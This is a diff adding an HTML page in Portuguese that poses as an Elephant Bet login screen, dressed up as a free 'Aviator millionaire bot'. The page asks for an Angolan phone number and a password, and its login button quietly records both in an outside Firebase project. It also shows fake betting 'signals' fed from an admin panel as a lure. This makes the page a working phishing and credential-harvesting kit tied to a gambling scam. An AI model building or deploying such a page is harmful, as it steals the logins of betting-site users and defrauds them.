@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BOT AVIATOR MILIONÁRIO GRÁTIS</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+body{background:#0d0d1c;color:#ffffff;font-weight:400;}
+
+.bot-header{background:#0d0d1c;border-top:1px solid rgba(255,255,255,0.05);border-bottom:1px solid rgba(255,255,255,0.05);}
+.bot-top{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;}
+.bot-left{background:#ff00a6;padding:6px;width:48%;text-align:center;font-size:12px;font-weight:600;border-radius:4px;color:#fff;}
+.bot-right{width:48%;text-align:center;color:#ffeb00;font-size:13px;font-weight:500;}
+.bot-bottom{display:flex;justify-content:space-around;padding:6px 5px;border-top:1px solid rgba(255,255,255,0.05);}
+.bot-item{font-size:11px;font-weight:500;text-align:center;color:#ffffffcc;}
+.bot-item span{color:#ffeb00;font-size:13px;font-weight:600;margin-left:4px;}
+.division-line{height:3px;background:#ff00a6;}
+
+.top-header{display:flex;justify-content:flex-end;align-items:center;gap:10px;padding:10px 15px;border-bottom:1px solid rgba(255,255,255,0.05);}
+.cadastro{background:#ff00a6;padding:7px 16px;border-radius:8px;font-size:12px;font-weight:600;color:#fff;border:2px solid #ffffff;cursor:pointer;}
+.close{font-size:18px;color:#ffffffcc;cursor:pointer;}
+
+.container{padding:20px 18px;}
+.small-text{color:#b3b7d6;font-size:13px;margin-bottom:6px;}
+h1{font-size:17px;line-height:24px;margin-bottom:20px;font-weight:600;color:#ffffff;}
+
+.form-group{position:relative;margin-bottom:18px;}
+.input{width:100%;padding:14px 12px;border-radius:7px;border:none;background:#1b1b2f;color:#ffffff;font-size:14px;font-weight:500;}
+.input:focus{outline:none;}
+
+.label-floating{position:absolute;left:12px;top:14px;color:#b3b7d6;font-size:13px;font-weight:500;pointer-events:none;transition:0.2s;}
+.input:focus + .label-floating,
+.input:not(:placeholder-shown) + .label-floating{
+top:-8px;left:10px;font-size:11px;color:#ffffff;background:#0d0d1c;padding:0 4px;
+}
+
+.input.error{border:1px solid #ff4d4d;}
+.error-message{color:#ff4d4d;font-size:12px;margin-top:4px;display:none;}
+
+.btn-login{width:100%;padding:14px;border:none;border-radius:7px;background:#ff00a6;color:#fff;font-size:14px;font-weight:600;margin-bottom:10px;cursor:pointer;}
+
+.forgot{text-align:center;margin-top:8px;color:#b3b7d6;font-size:13px;cursor:pointer;}
+.support{position:fixed;bottom:28px;width:100%;text-align:center;color:#b3b7d6;font-size:13px;}
+.support span{text-decoration:underline;cursor:pointer;}
+</style>
+</head>
+<body>
+
+<div class="bot-header">
+<div class="bot-top">
+<div class="bot-left">BOT MILIONÁRIO</div>
+<div class="bot-right" id="tituloBot">INICIAR SESSÃO ELEPHANT BET</div>
+</div>
+<div class="bot-bottom">
+<div class="bot-item">PROTEÇÃO <span id="protecao">0.0X</span></div>
+<div class="bot-item">GRÁFICO <span id="grafico">0%</span></div>
+<div class="bot-item">SAÍDA <span id="saida">0.0X</span></div>
+</div>
+</div>
+
+<div class="division-line"></div>
+
+<div class="top-header">
+<div class="cadastro" onclick="window.location.href=''">CADASTRE-SE</div>
+<div class="close">✕</div>
+</div>
+
+<div class="container">
+<div class="small-text">Já tem uma conta?</div>
+<h1>FAÇA LOGIN, ESTAMOS ESPERANDO POR VOCÊ.</h1>
+
+<div class="form-group">
+<input type="text" id="telefone" class="input" placeholder=" " autocomplete="off" inputmode="numeric">
+<label class="label-floating">Número de telefone *</label>
+<div class="error-message" id="erroTelefone">Número inválido</div>
+</div>
+
+<div class="form-group">
+<input type="password" id="senha" class="input" placeholder=" ">
+<label class="label-floating">Senha *</label>
+<div class="error-message" id="erroSenha">Este campo é obrigatório</div>
+</div>
+
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:15px;">
+<input type="checkbox" id="lembrar" style="width:16px;height:16px;accent-color:#ff00a6;cursor:pointer;">
+<label for="lembrar" style="font-size:13px;color:#b3b7d6;cursor:pointer;">Lembre-se de mim</label>
+</div>
+
+<button class="btn-login" onclick="criarConta()">ENTRAR</button>
+<div class="forgot">ESQUECEU SUA SENHA?</div>
+</div>
+
+<div class="support">👤 <span>Contate o suporte</span></div>
+
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyChrog4zZNoK8HTMl1MTMD43U7HHxBMtVw",
+authDomain: "palpite3ad.firebaseapp.com",
+databaseURL: "https://palpite3ad-default-rtdb.firebaseio.com",
+projectId: "palpite3ad",
+storageBucket: "palpite3ad.appspot.com",
+};
+
+firebase.initializeApp(firebaseConfig);
+const auth = firebase.auth();
+const db = firebase.database();
+
+/* 🔥 CABEÇALHO EM TEMPO REAL (PAINEL ADM) */
+db.ref("sinais").on("value", function(snapshot){
+const dados = snapshot.val();
+if(dados){
+document.getElementById("tituloBot").innerText = dados.titulo || "INICIAR SESSÃO ELEPHANT BET";
+document.getElementById("protecao").innerText = dados.protecao || "0.0X";
+document.getElementById("grafico").innerText = dados.grafico || "0%";
+document.getElementById("saida").innerText = dados.saida || "0.0X";
+}
+});
+
+/* TELEFONE 244 FIXO */
+const telefoneInput = document.getElementById("telefone");
+telefoneInput.addEventListener("focus",()=>{
+if(telefoneInput.value===""){telefoneInput.value="244";setTimeout(()=>telefoneInput.setSelectionRange(3,3),0);}
+});
+telefoneInput.addEventListener("input",()=>{
+let numeros=telefoneInput.value.replace(/\D/g,'');
+if(!numeros.startsWith("244")) numeros="244";
+if(numeros.length>12) numeros=numeros.slice(0,12);
+telefoneInput.value=numeros;
+});
+telefoneInput.addEventListener("keydown",(e)=>{
+if(telefoneInput.selectionStart<=3&&(e.key==="Backspace"||e.key==="Delete")) e.preventDefault();
+});
+telefoneInput.addEventListener("blur",()=>{
+if(telefoneInput.value.length<12) telefoneInput.value="";
+});
+
+/* CRIAR CONTA */
+function criarConta(){
+const telefone=telefoneInput.value.trim();
+const senha=document.getElementById("senha").value.trim();
+const erroTelefone=document.getElementById("erroTelefone");
+const erroSenha=document.getElementById("erroSenha");
+
+erroTelefone.style.display="none";
+erroSenha.style.display="none";
+telefoneInput.classList.remove("error");
+document.getElementById("senha").classList.remove("error");
+
+let hasError=false;
+if(telefone.length!==12){erroTelefone.style.display="block";telefoneInput.classList.add("error");hasError=true;}
+if(!senha){erroSenha.style.display="block";document.getElementById("senha").classList.add("error");hasError=true;}
+if(hasError) return;
+
+const emailFake=telefone+"@bot.com";
+
+auth.createUserWithEmailAndPassword(emailFake,senha)
+.then(userCredential=>{
+const uid=userCredential.user.uid;
+db.ref("users/"+uid).set({telefone:telefone,criadoEm:new Date().toLocaleString()});
+alert("Conta criada com sucesso!");
+})
+.catch(error=>{alert(error.message);});
+}
+</script>
+
+</body>
+</html>
